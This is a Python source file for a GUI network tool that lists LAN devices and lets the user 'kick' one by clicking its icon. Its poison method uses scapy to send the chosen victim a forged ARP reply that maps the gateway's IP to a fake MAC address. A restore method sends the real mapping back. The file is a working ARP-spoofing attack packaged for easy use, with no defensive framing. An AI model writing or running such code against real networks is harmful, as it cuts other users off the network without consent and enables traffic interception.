# client.py
# client from a listing in nbtscan

from tkinter import *
from button import CButton
from tkinter import messagebox
from scapy.all import *
import netifaces

class Client:
	def __init__(self, parent, x, y, hostname, mac=None, kicked=False, datboi_mac=None):
		self.hostname = hostname
		self.mac_addr = mac[0]
		self.graphic = PhotoImage(file="assets/device.png")

		self.parent = parent 

		if not kicked:
			self.button = CButton(self.parent, x, y, lambda: self.poison(hostname, mac, netifaces.gateways()['default'][netifaces.AF_INET][0]))
		else:
			self.button = CButton(self.parent, x, y, lambda: self.restore(hostname, mac, netifaces.gateways()['default'][netifaces.AF_INET][0], datboi_mac))

		self.button.set_image(self.graphic)

		self.text_id = parent.create_text(x + 32, y + 3, fill="#FFFFFF", anchor="nw", text=hostname, font=("assets/Roboto-Regular.ttf", 12, "normal"))

	def click(self, x, y):
		return self.button.click(x, y)

	def get_button(self):
		return self.button

	def clear(self):
		return self.parent.delete(self.text_id)
	
	def get_mac(self):
		return self.mac_addr

	def poison(self, victim_ip, victim_mac, gateway_ip):
		# Send the victim an ARP packet pairing 
		#the gateway ip with the wrong mac address
		packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
		send(packet, verbose=0)

	def restore(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
		# Send the victim an ARP packet pairing 
		#the gateway ip with the correct mac address
		packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
		send(packet, verbose=0)